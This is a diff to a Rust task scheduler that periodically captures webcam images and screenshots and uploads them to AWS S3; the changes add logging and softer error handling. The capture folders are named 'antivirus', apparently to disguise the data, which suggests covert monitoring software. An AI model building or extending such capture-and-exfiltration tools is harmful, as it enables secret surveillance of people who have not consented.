@@ -2,7 +2,7 @@
 use std::error::Error;
 use std::time::{Duration, Instant};
 use std::path::PathBuf;
-use log::{error, info};
+use log::{error, info, debug};
 use crate::config::ConfigAws;
 use crate::s3upload::S3Uploader;
 use crate::img::imgutil::SecureFolder;
@@ -36,42 +36,70 @@ impl TaskProcessor {
     }
 
     pub async fn process_tasks(&mut self, config: &ConfigAws) -> Result<(), Box<dyn Error>> {
-        self.process_camera_capture(config)?;
-        self.process_screenshot_capture(config)?;
-        self.process_uploads(config).await?;
+        info!("Processing tasks - Camera Capture");
+        if let Err(e) = self.process_camera_capture(config) {
+            error!("Error processing camera capture: {}", e);
+        }
+
+        info!("Processing tasks - Screen Capture");
+        if let Err(e) = self.process_screenshot_capture(config) {
+            error!("Error processing screenshot capture: {}", e);
+        }
+
+        info!("Processing tasks - Upload Capture");
+        if let Err(e) = self.process_uploads(config).await {
+            error!("Error processing uploads: {}", e);
+        }
+
         Ok(())
     }
 
     fn process_camera_capture(&mut self, config: &ConfigAws) -> Result<(), Box<dyn Error>> {
         let camshot_interval = Duration::from_secs(config.settings.cameracaptureduration * 60);
 
+        debug!("Camera Capture Interval: {} seconds", camshot_interval.as_secs());
+        debug!("Time since last camera capture: {} seconds", self.last_camerashot_time.elapsed().as_secs());
+
         if self.last_camerashot_time.elapsed() >= camshot_interval {
-            info!("Initializing secure storage for camera...");
+            info!("Initiating camera capture...");
             let secure_folder_cc = SecureFolder::new(self.base_path.clone(), "cc_antivirus")?;
 
             if let Err(e) = capturecam(&secure_folder_cc) {
                 error!("Camera capture failed: {}", e);
+            } else {
+                info!("Camera capture completed successfully.");
             }
 
             self.last_camerashot_time = Instant::now();
+        } else {
+            debug!("Skipping camera capture. Interval not reached.");
         }
+
         Ok(())
     }
 
     fn process_screenshot_capture(&mut self, config: &ConfigAws) -> Result<(), Box<dyn Error>> {
         let screenshot_interval = Duration::from_secs(config.settings.screenshotduration * 60);
 
+        debug!("Screenshot Capture Interval: {} seconds", screenshot_interval.as_secs());
+        debug!("Time since last screenshot capture: {} seconds", self.last_screenshot_time.elapsed().as_secs());
+
         if self.last_screenshot_time.elapsed() >= screenshot_interval {
+            info!("Initiating screenshot capture...");
             let secure_folder_sc = SecureFolder::new(self.base_path.clone(), "sc_antivirus")?;
 
-            info!("Initiating screenshot capture...");
-            screenshotadv::capture_screenshot(&secure_folder_sc)?;
+            if let Err(e) = screenshotadv::capture_screenshot(&secure_folder_sc) {
+                error!("Screenshot capture failed: {}", e);
+            } else {
+                info!("Screenshot capture completed successfully.");
+            }
 
             self.last_screenshot_time = Instant::now();
+        } else {
+            debug!("Skipping screenshot capture. Interval not reached.");
         }
         Ok(())
     }
-
     async fn process_uploads(&mut self, config: &ConfigAws) -> Result<(), Box<dyn Error>> {
         let upload_interval = Duration::from_secs(config.settings.uploadduration * 60);
 
